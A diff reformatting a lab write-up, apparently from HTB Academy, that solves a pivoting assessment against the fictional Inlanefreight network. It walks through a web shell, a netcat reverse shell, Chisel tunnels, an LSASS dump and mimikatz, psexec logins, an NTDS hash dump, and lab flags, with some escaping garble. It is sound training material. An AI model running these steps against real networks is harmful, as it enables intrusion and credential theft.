@@ -1,37 +1,30 @@
-# Labs - Skills Assessment
+# Pivoting Assessment
 
-## 
+## Labs - Skills Assessment
 
-Scenario[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#scenario)
+###
+
+Scenario
 
 A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:
 
-## 
+###
 
-Objectives[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#objectives)
+Objectives
 
-- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
-    
+* Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
+* Use the web shell access to enumerate and pivot to an internal host.
+* Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
+* Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
+* Grab `any/all` flags that can be found.
 
-- Use the web shell access to enumerate and pivot to an internal host.
-    
+###
 
-- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
-    
+Questions
 
-- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
-    
+####
 
-- Grab `any/all` flags that can be found.
-    
-
-## 
-
-Questions[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#questions)
-
-### 
-
-1. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#1.-once-on-the-webserver-enumerate-the-host-for-credentials-that-can-be-used-to-start-a-pivot-or-tun)
+1. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.
 
 Access web shell on `http://10.129.195.1/`
 
@@ -43,27 +36,27 @@ drwxr-xr-x 4 webadmin webadmin 4096 May 18 2022 .
 
 drwxr-xr-x 4 root root 4096 May 6 2022 ..
 
--rw------- 1 webadmin webadmin 1262 May 23 2022 .bash_history
+\-rw------- 1 webadmin webadmin 1262 May 23 2022 .bash\_history
 
--rw-r--r-- 1 webadmin webadmin 220 May 6 2022 .bash_logout
+\-rw-r--r-- 1 webadmin webadmin 220 May 6 2022 .bash\_logout
 
--rw-r--r-- 1 webadmin webadmin 3771 May 6 2022 .bashrc
+\-rw-r--r-- 1 webadmin webadmin 3771 May 6 2022 .bashrc
 
 drwx------ 2 webadmin webadmin 4096 May 16 2022 .cache
 
--rw-r--r-- 1 webadmin webadmin 807 May 6 2022 .profile
+\-rw-r--r-- 1 webadmin webadmin 807 May 6 2022 .profile
 
 drwx--x--x 2 webadmin webadmin 4096 May 16 2022 .ssh
 
--rw-r--r-- 1 root root 163 May 16 2022 for-admin-eyes-only
+\-rw-r--r-- 1 root root 163 May 16 2022 for-admin-eyes-only
 
--rw-r--r-- 1 root root 2622 May 16 2022 id_rsa
+\-rw-r--r-- 1 root root 2622 May 16 2022 id\_rsa
 
 ​
 
 p0wny@shell:…/www/html# cat /home/webadmin/for-admin-eyes-only
 
-# note to self,
+## note to self,
 
 in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
 
@@ -75,17 +68,17 @@ Found credentials `mlefay:Plain Human work!`
 
 **Answer:** `**webadmin**`
 
-### 
+####
 
-2. Submit the credentials found in the user's home directory. (Format: user:password)[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#2.-submit-the-credentials-found-in-the-users-home-directory.-format-user-password)
+2. Submit the credentials found in the user's home directory. (Format: user:password)
 
 Continued from question above:
 
 **Answer:** `**mlefay:Plain Human work!**`
 
-### 
+####
 
-3. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#3.-enumerate-the-internal-network-and-discover-another-active-host.-submit-the-ip-address-of-that-ho)
+3. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.
 
 Caught a reverse shell using the web shell above with `nc mkfifo` command from [https://www.revshells.com/](https://www.revshells.com/) to enumerate further. Found that the host was dual-homed:
 
@@ -95,39 +88,37 @@ inlanefreight.local
 
 www-data@inlanefreight:/var/www/html$ ip a
 
-<SNIP>
-
-3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+3: ens192: \<BROADCAST,MULTICAST,UP,LOWER\_UP> mtu 1500 qdisc mq state UP group default qlen 1000
 
 link/ether 00:50:56:b9:1b:27 brd ff:ff:ff:ff:ff:ff
 
 inet 172.16.5.15/16 brd 172.16.255.255 scope global ens192
 
-valid_lft forever preferred_lft forever
+valid\_lft forever preferred\_lft forever
 
 inet6 fe80::250:56ff:feb9:1b27/64 scope link
 
-valid_lft forever preferred_lft forever
+valid\_lft forever preferred\_lft forever
 
 www-data@inlanefreight:/var/www/html$ for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
 
-64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.021 ms
+64 bytes from 172.16.5.15: icmp\_seq=1 ttl=64 time=0.021 ms
 
-64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.455 ms
+64 bytes from 172.16.5.35: icmp\_seq=1 ttl=128 time=0.455 ms
 
 **Answer:** `**172.16.5.35**`
 
-### 
+####
 
-4. Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#4.-use-the-information-you-gathered-to-pivot-to-the-discovered-host.-submit-the-contents-of-c-flag.t)
+4. Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.
 
-#### 
 
-Setup pivot from Attack host through inlanefreight.local (pivot host) to `**172.16.5.35**`:[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#setup-pivot-from-attack-host-through-inlanefreight.local-pivot-host-to-172.16.5.35)
+
+Setup pivot from Attack host through inlanefreight.local (pivot host) to `**172.16.5.35**`:
 
 **Step 1:** Start Chisel server (listener) on attack host:
 
-┌──(kali㉿kali)-[~]
+┌──(kali㉿kali)-\[\~]
 
 └─$ chisel server --reverse -v -p 1111 --socks5
 
@@ -145,9 +136,9 @@ www-data@inlanefreight:/var/www/html$ ./chisel client -v 10.10.14.2:1111 R:socks
 
 2023/03/05 18:56:05 client: tun: SSH connected
 
-2023/03/05 18:56:11 client: tun: conn#1: Open [1/1]
+2023/03/05 18:56:11 client: tun: conn#1: Open \[1/1]
 
-2023/03/05 18:56:24 client: tun: conn#2: Open [2/2]
+2023/03/05 18:56:24 client: tun: conn#2: Open \[2/2]
 
 Step 3: Add entry to proxychains configuration file - `/etc/proxychains.conf`
 
@@ -155,11 +146,9 @@ socks5 127.0.0.1 1080
 
 Step 4: Use proxychains to enumerate and access `**172.16.5.35**`:
 
-┌──(kali㉿kali)-[~]
+┌──(kali㉿kali)-\[\~]
 
 └─$ proxychains nmap 172.16.5.35 -F -T4
-
-<SNIP>
 
 Nmap scan report for 172.16.5.35
 
@@ -183,17 +172,17 @@ PORT STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
 
-#### 
 
-Access target host `**172.16.5.35**` **using SSH or RDP with credentials above:**[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#access-target-host-172.16.5.35-using-ssh-or-rdp-with-credentials-above)
 
-┌──(kali㉿kali)-[~]
+Access target host `**172.16.5.35**` **using SSH or RDP with credentials above:**
+
+┌──(kali㉿kali)-\[\~]
 
 └─$ proxychains ssh mlefay@172.16.5.35
 
 ​
 
-┌──(kali㉿kali)-[~]
+┌──(kali㉿kali)-\[\~]
 
 └─$ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:linux,/home/kali/Transfer
 
@@ -207,9 +196,9 @@ S1ngl3-Piv07-3@sy-Day
 
 **Answer:** `**S1ngl3-Piv07-3@sy-Day**`
 
-### 
+####
 
-5. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#5.-in-previous-pentests-against-inlanefreight-we-have-seen-that-they-have-a-bad-habit-of-utilizing-a)
+5. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?
 
 Dump LSASS:
 
@@ -227,7 +216,7 @@ PS C:\Users\mlefay> Get-Process lsass
 
 Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName
 
-------- ------ ----- ----- ------ -- -- -----------
+***
 
 1253 29 6728 17352 1.52 668 0 lsass
 
@@ -235,17 +224,17 @@ Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName
 
 PS C:\Users\mlefay> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 668 C:\lsass.dmp full
 
-PS C:\Users\mlefay> dir C:\
+PS C:\Users\mlefay> dir C:\\
 
 ​
 
-Directory: C:\
+Directory: C:\\
 
 ​
 
 Mode LastWriteTime Length Name
 
----- ------------- ------ ----
+***
 
 d----- 2/25/2022 10:20 AM PerfLogs
 
@@ -257,9 +246,9 @@ d-r--- 5/17/2022 11:14 AM Users
 
 d----- 5/17/2022 11:10 AM Windows
 
--a---- 5/17/2022 8:41 AM 21 Flag.txt
+\-a---- 5/17/2022 8:41 AM 21 Flag.txt
 
--a---- 3/5/2023 4:54 PM 46202253 lsass.dmp
+\-a---- 3/5/2023 4:54 PM 46202253 lsass.dmp
 
 ​
 
@@ -275,13 +264,13 @@ PS C:\Users\mlefay> ./mimikatz.exe
 
 .## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
 
-## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+### / \ ## /\*\*\* Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 
-## \ / ## > https://blog.gentilkiwi.com/mimikatz
+### \ / ## > https://blog.gentilkiwi.com/mimikatz
 
 '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
 
-'#####' > https://pingcastle.com / https://mysmartlogon.com ***/
+'#####' > https://pingcastle.com / https://mysmartlogon.com \*\*\*/
 
 ​
 
@@ -296,8 +285,6 @@ mimikatz # sekurlsa::logonPasswords
 Opening : 'C:\lsass.dmp' file for minidump...
 
 ​
-
-<SNIP>
 
 Authentication Id : 0 ; 160212 (00000000:000271d4)
 
@@ -315,16 +302,12 @@ SID : S-1-5-21-3858284412-1730064152-742000644-1103
 
 msv :
 
-[00000003] Primary
+\[00000003] Primary
 
 * Username : vfrank
-
 * Domain : INLANEFREIGHT
-
 * NTLM : 2e16a00be74fa0bf862b4256d0347e83
-
 * SHA1 : b055c7614a5520ea0fc1184ac02c88096e447e0b
-
 * DPAPI : 97ead6d940822b2c57b18885ffcc5fb4
 
 tspkg :
@@ -332,17 +315,13 @@ tspkg :
 wdigest :
 
 * Username : vfrank
-
 * Domain : INLANEFREIGHT
-
 * Password : (null)
 
 kerberos :
 
 * Username : vfrank
-
 * Domain : INLANEFREIGHT.LOCAL
-
 * Password : Imply wet Unmasked!
 
 ssp :
@@ -353,13 +332,13 @@ Found credentials `vfrank:Imply wet Unmasked!`
 
 **Answer:** `**vfrank**`
 
-### 
+####
 
-6. For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#6.-for-your-next-hop-enumerate-the-networks-and-then-utilize-a-common-remote-access-solution-to-pivo)
+6. For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.
 
-#### 
 
-Network discovery (found that the host was dual-homed):[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#network-discovery-found-that-the-host-was-dual-homed)
+
+Network discovery (found that the host was dual-homed):
 
 PS C:\Users\mlefay> hostname
 
@@ -403,9 +382,9 @@ Subnet Mask . . . . . . . . . . . : 255.255.0.0
 
 Default Gateway . . . . . . . . . :
 
-#### 
 
-Host discovery (CMD):[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#host-discovery-cmd)
+
+Host discovery (CMD):
 
 mlefay@PIVOT-SRV01 C:\Users\mlefay>for /L %i in (1 1 254) do @ping 172.16.6.%i -n 2 -w 100 > nul && echo 172.16.6.%i is up.
 
@@ -413,9 +392,9 @@ mlefay@PIVOT-SRV01 C:\Users\mlefay>for /L %i in (1 1 254) do @ping 172.16.6.%i -
 
 172.16.6.35 is up.
 
-#### 
 
-Setup pivot from Attack host through inlanefreight.local (pivot host 1) and PIVOT-SRV01 (pivot host 2) to `**172.16.6.25**`:[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#setup-pivot-from-attack-host-through-inlanefreight.local-pivot-host-1-and-pivot-srv01-pivot-host-2-t)
+
+Setup pivot from Attack host through inlanefreight.local (pivot host 1) and PIVOT-SRV01 (pivot host 2) to `**172.16.6.25**`:
 
 **Step 1:** Start Chisel server (listener) on pivot host 1
 
@@ -433,11 +412,9 @@ socks5 127.0.0.1 2080
 
 Step 4: Use proxychains to enumerate and access `**172.16.6.25**`:
 
-┌──(kali㉿kali)-[~]
+┌──(kali㉿kali)-\[\~]
 
 └─$ proxychains nmap 172.16.6.25 -F -T4
-
-<SNIP>
 
 Nmap scan report for 172.16.6.25
 
@@ -459,21 +436,21 @@ PORT STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 129.59 seconds
 
-#### 
 
-Access target host `**172.16.6.25**` **using Impacket-PsExec or RDP with creds found earlier:**[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#access-target-host-172.16.6.25-using-impacket-psexec-or-rdp-with-creds-found-earlier)
 
-┌──(kali㉿kali)-[~]
+Access target host `**172.16.6.25**` **using Impacket-PsExec or RDP with creds found earlier:**
+
+┌──(kali㉿kali)-\[\~]
 
 └─$ proxychains impacket-psexec vfrank:'Imply wet Unmasked!'@172.16.6.25
 
 ​
 
-┌──(kali㉿kali)-[~]
+┌──(kali㉿kali)-\[\~]
 
 └─$ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:linux,/home/kali/Transfer
 
-C:\Windows\system32> dir C:\
+C:\Windows\system32> dir C:\\
 
 Volume in drive C has no label.
 
@@ -481,21 +458,31 @@ Volume Serial Number is C41A-F2ED
 
 ​
 
-Directory of C:\
+Directory of C:\\
 
 ​
 
 05/17/2022 11:38 AM 23 Flag.txt
 
-12/14/2020 07:22 PM <DIR> PerfLogs
+12/14/2020 07:22 PM
 
-04/27/2022 06:19 AM <DIR> Program Files
+PerfLogs
 
-04/27/2022 06:18 AM <DIR> Program Files (x86)
+04/27/2022 06:19 AM
 
-05/17/2022 08:15 AM <DIR> Users
+Program Files
 
-03/05/2023 04:33 PM <DIR> Windows
+04/27/2022 06:18 AM
+
+Program Files (x86)
+
+05/17/2022 08:15 AM
+
+Users
+
+03/05/2023 04:33 PM
+
+Windows
 
 1 File(s) 23 bytes
 
@@ -509,13 +496,13 @@ N3tw0rk-H0pp1ng-f0R-FuN
 
 **Answer:** `**N3tw0rk-H0pp1ng-f0R-FuN**`
 
-### 
+####
 
-7. Submit the contents of C:\Flag.txt located on the Domain Controller.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#7.-submit-the-contents-of-c-flag.txt-located-on-the-domain-controller.)
+7. Submit the contents of C:\Flag.txt located on the Domain Controller.
 
-#### 
 
-Network discovery (found that the host was dual-homed):[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#network-discovery-found-that-the-host-was-dual-homed-1)
+
+Network discovery (found that the host was dual-homed):
 
 C:\Windows\system32> hostname
 
@@ -559,9 +546,9 @@ Subnet Mask . . . . . . . . . . . : 255.255.0.0
 
 Default Gateway . . . . . . . . . :
 
-#### 
 
-Host discovery (CMD):[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#host-discovery-cmd-1)
+
+Host discovery (CMD):
 
 C:\Windows\system32> for /L %i in (1 1 254) do @ping 172.16.10.%i -n 2 -w 100 > nul && echo 172.16.10.%i is up.
 
@@ -569,9 +556,9 @@ C:\Windows\system32> for /L %i in (1 1 254) do @ping 172.16.10.%i -n 2 -w 100 > 
 
 172.16.10.25 is up.
 
-#### 
 
-Setup pivot from Attack host through inlanefreight.local (pivot host 1) and PIVOT-SRV01 (pivot host 2) and PIVOTWIN10 (pivot host 3) to `**172.16.10.5**`:[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#setup-pivot-from-attack-host-through-inlanefreight.local-pivot-host-1-and-pivot-srv01-pivot-host-2-a)
+
+Setup pivot from Attack host through inlanefreight.local (pivot host 1) and PIVOT-SRV01 (pivot host 2) and PIVOTWIN10 (pivot host 3) to `**172.16.10.5**`:
 
 **Step 1:** Start Chisel server (listener) on pivot host 2
 
@@ -589,11 +576,9 @@ socks5 127.0.0.1 3080
 
 Step 4: Use proxychains to enumerate and access `**172.16.10.5**`:
 
-┌──(kali㉿kali)-[~]
+┌──(kali㉿kali)-\[\~]
 
 └─$ proxychains nmap 172.16.10.5 -F -T4
-
-<SNIP>
 
 Nmap scan report for 172.16.10.5
 
@@ -619,17 +604,15 @@ PORT STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 218.95 seconds
 
-#### 
 
-Access target host `**172.16.6.25**` **using Impacket-PsExec:**[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#access-target-host-172.16.6.25-using-impacket-psexec)
 
-┌──(kali㉿kali)-[~]
+Access target host `**172.16.6.25**` **using Impacket-PsExec:**
+
+┌──(kali㉿kali)-\[\~]
 
 └─$ proxychains impacket-psexec vfrank:'Imply wet Unmasked!'@172.16.10.5
 
-<SNIP>
-
-Microsoft Windows [Version 10.0.17763.107]
+Microsoft Windows \[Version 10.0.17763.107]
 
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -647,7 +630,7 @@ nt authority\system
 
 ​
 
-C:\Windows\system32> dir C:\
+C:\Windows\system32> dir C:\\
 
 Volume in drive C has no label.
 
@@ -655,21 +638,31 @@ Volume Serial Number is DA7F-3F25
 
 ​
 
-Directory of C:\
+Directory of C:\\
 
 ​
 
 05/18/2022 12:33 PM 20 Flag.txt.txt
 
-09/14/2018 11:12 PM <DIR> PerfLogs
+09/14/2018 11:12 PM
 
-12/14/2020 06:43 PM <DIR> Program Files
+PerfLogs
 
-09/14/2018 11:21 PM <DIR> Program Files (x86)
+12/14/2020 06:43 PM
 
-05/03/2022 09:06 AM <DIR> Users
+Program Files
 
-03/05/2023 05:04 PM <DIR> Windows
+09/14/2018 11:21 PM
+
+Program Files (x86)
+
+05/03/2022 09:06 AM
+
+Users
+
+03/05/2023 05:04 PM
+
+Windows
 
 1 File(s) 20 bytes
 
@@ -683,21 +676,19 @@ C:\Windows\system32> type C:\Flag.txt.txt
 
 **Answer:** `**3nd-0xf-Th3-R@inbow!**`
 
-#### 
 
-**Extra:**[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/pivoting-tunneling-and-port-forwarding/labs-skills-assessment#extra)
 
-┌──(kali㉿kali)-[~/Transfer]
+**Extra:**
+
+┌──(kali㉿kali)-\[\~/Transfer]
 
 └─$ proxychains crackmapexec smb 172.16.10.5 -u vfrank -p 'Imply wet Unmasked!' --ntds
 
-<SNIP>
+SMB 172.16.10.5 445 ACADEMY-PIVOT-D \[\*] Windows 10.0 Build 17763 x64 (name:ACADEMY-PIVOT-D) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 
-SMB 172.16.10.5 445 ACADEMY-PIVOT-D [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-PIVOT-D) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB 172.16.10.5 445 ACADEMY-PIVOT-D \[+] INLANEFREIGHT.LOCAL\vfrank:Imply wet Unmasked! (Pwn3d!)
 
-SMB 172.16.10.5 445 ACADEMY-PIVOT-D [+] INLANEFREIGHT.LOCAL\vfrank:Imply wet Unmasked! (Pwn3d!)
-
-SMB 172.16.10.5 445 ACADEMY-PIVOT-D [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB 172.16.10.5 445 ACADEMY-PIVOT-D \[+] Dumping the NTDS, this could take a while so go grab a redbull...
 
 SMB 172.16.10.5 445 ACADEMY-PIVOT-D Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
 
@@ -719,4 +710,4 @@ SMB 172.16.10.5 445 ACADEMY-PIVOT-D PIVOT-SRV01$:1107:aad3b435b51404eeaad3b435b5
 
 SMB 172.16.10.5 445 ACADEMY-PIVOT-D PIVOTWIN10$:1108:aad3b435b51404eeaad3b435b51404ee:270257c51e2d5a6ce73e968306b87eb4:::
 
-SMB 172.16.10.5 445 ACADEMY-PIVOT-D [+] Dumped 10 NTDS hashes to /home/ka
+SMB 172.16.10.5 445 ACADEMY-PIVOT-D \[+] Dumped 10 NTDS hashes to /home/ka
